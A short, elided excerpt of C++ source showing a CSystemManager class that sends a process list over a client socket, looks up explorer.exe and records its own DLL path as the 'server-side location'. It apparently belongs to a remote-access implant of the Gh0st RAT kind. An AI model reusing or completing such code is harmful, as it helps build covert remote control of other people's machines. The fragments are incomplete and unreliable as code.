...
CSystemManager::CSystemManager(CClientSocket *pClient, HMODULE mod) : CManager(pClient)
{
    m_hDllModule = mod;
    SendProcessList();
...
{
    DWORD	dwProcessID = GetProcessID_S("explorer.exe");
    if (dwProcessID == 0)
        return ;
...
void CSystemManager::GetSystemInfo(tagSystemInfo* pSysInfo)
{
    ...
    // 服务端位置
    GetModuleFileName(m_hDllModule,pSysInfo->szDLLPath,sizeof(pSysInfo->szDLLPath));
